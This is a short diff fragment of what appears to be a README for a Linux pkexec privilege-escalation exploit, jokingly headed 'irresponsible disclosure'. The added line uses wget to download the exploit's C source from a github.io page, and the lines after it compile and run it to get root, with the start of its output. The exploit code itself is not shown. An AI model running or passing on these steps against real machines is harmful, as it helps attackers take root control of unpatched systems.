@@ -5,6 +5,7 @@ bla bla irresponsible disclosure
 
 terminal:
 ```console
+user@linux:~$ wget https://g1f1.github.io/blasty-vs-pkexec.c/blasty-vs-pkexec.c
 user@linux:~$ gcc -o blasty blasty-vs-pkexec.c
 user@linux:~$ ./blasty
 [~] compile helper..
